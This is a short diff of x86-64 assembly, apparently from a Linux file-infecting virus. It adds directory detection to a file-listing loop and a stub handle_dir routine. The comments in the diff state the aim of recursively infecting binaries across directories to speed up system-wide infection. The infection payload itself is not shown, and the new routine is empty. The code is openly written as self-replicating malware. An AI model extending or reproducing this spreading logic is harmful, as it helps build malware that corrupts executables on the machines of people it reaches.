@@ -497,6 +497,12 @@ list_files:
 			mov r8, rsi; save rsi
 			lea r9, [rsi + rcx] ; current linux_dirent64*
 			lea rsi, [r9 + 19];filename
+			cmp byte[r9 + 18], DIRECTORY_FILE; [r9 + 18]
+			jne maybe_reg_file
+			mov rdi, rsi; pass fname as arg
+			call handle_dir
+			jmp skip_file
+			maybe_reg_file:
 			cmp byte[r9 + 18], 	REGULAR_FILE ; [r9 +18] is file type
 			jne skip_file
 			;later add here directory handle for recursive infection
@@ -515,6 +521,14 @@ list_files:
 	dir_read_exit:
 	add rsp, 4
 	add rsp,1024
+retn
+
+;void handle_dir(char *fname)
+;we wanna open the dir then search in it (and nested directories if needed) for a binary to infect then launch
+;that infected binary will then infect recursively everything else from it's own directory (.) ownards
+;this will make system infection faster
+handle_dir:
+
 retn
 
 ;infect ONE file
